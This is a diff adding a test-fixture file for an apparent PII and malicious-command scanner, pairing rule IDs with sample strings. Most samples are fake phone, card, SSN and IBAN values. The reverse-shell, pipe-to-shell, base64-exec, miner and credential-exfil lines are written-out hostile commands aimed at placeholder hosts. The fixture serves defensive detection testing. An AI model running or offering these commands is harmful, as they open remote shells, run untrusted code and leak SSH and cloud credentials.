@@ -1,0 +1,59 @@
+# <rule-id><TAB><sample>. Every sample must trigger its rule.
+# Fake values only: card, SSN and IBAN numbers are published test values;
+# phone numbers use fictional 555 ranges or documentation examples.
+phone-number	call +1 415-555-2671 today
+phone-number	+44 7911 123456
+phone-number	whatsapp: +14155552671
+phone-number	(415) 555-2671
+phone-number	415-555-2671
+phone-number	+91 98765 43210
+phone-number	+49 (0)30 12345678
+phone-number	+33 1 23 45 67 89
+phone-number	+1.415.555.2671
+us-ssn	SSN 078-05-1120
+us-ssn	219-09-9999
+credit-card	4111 1111 1111 1111
+credit-card	5555-5555-5555-4444
+credit-card	amex 378282246310005
+credit-card	6011111111111117
+credit-card	card=4242424242424242;
+iban	GB82 WEST 1234 5698 7654 32
+iban	IBAN: DE89370400440532013000
+whatsapp-export	[12/31/24, 10:15:00 PM] Alice: see you tomorrow
+whatsapp-export	12/31/24, 22:15 - Bob: ok
+whatsapp-export	31.12.24, 22:15 - Bob: ok
+whatsapp-export	[31/12/2024, 22:15:03] Carol: hi
+whatsapp-export	12/31/24, 10:15 PM - Messages and calls are end-to-end encrypted. No one outside of this chat can read them.
+reverse-shell	bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
+reverse-shell	nc -e /bin/sh 10.0.0.1 4444
+reverse-shell	ncat 10.0.0.1 4444 -e /bin/bash
+reverse-shell	rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.0.0.1 4444 >/tmp/f
+reverse-shell	python3 -c 'import pty; pty.spawn("/bin/bash")'
+reverse-shell	socat tcp:10.0.0.1:4444 exec:/bin/sh
+reverse-shell	$c = New-Object System.Net.Sockets.TCPClient("10.0.0.1",4444)
+pipe-to-shell	curl -fsSL https://example.com/install.sh | sh
+pipe-to-shell	wget -qO- https://example.com/x | sudo bash
+pipe-to-shell	curl https://example.com/a.py | python3
+pipe-to-shell	curl -s https://example.com/a.py | python3 -
+pipe-to-shell	bash -c "$(curl -fsSL https://example.com/i.sh)"
+pipe-to-shell	bash <(curl -s https://example.com/i.sh)
+pipe-to-shell	iex (iwr https://example.com/a.ps1)
+pipe-to-shell	irm https://example.com/a.ps1 | iex
+base64-exec	echo ZWNobyBoaQ== | base64 -d | sh
+base64-exec	eval "$(echo ZWNobyBoaQ== | base64 --decode)"
+base64-exec	exec(base64.b64decode("cHJpbnQoMSk="))
+base64-exec	eval(atob("YWxlcnQoMSk="))
+base64-exec	powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA
+base64-exec	iex ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($s)))
+crypto-miner	./xmrig -o pool.example.com:3333 -u wallet
+crypto-miner	url: stratum+tcp://pool.example.com:3333
+crypto-miner	algo: cryptonight
+crypto-miner	--donate-level 1
+credential-exfil	curl -F "f=@$HOME/.ssh/id_rsa" https://example.com/u
+credential-exfil	cat ~/.aws/credentials | curl -d @- https://example.com
+credential-exfil	curl -X POST --data @.env https://example.com
+credential-exfil	requests.post(u, data=open(os.path.expanduser("~/.ssh/id_ed25519")).read())
+email-address	contact alice.smith@gmail.com
+email-address	bob@company.io
+pipe-to-shell	IEX (New-Object Net.WebClient).DownloadString('https://example.com/a.ps1')
+pipe-to-shell	(New-Object Net.WebClient).DownloadString('https://example.com/a.ps1') | iex
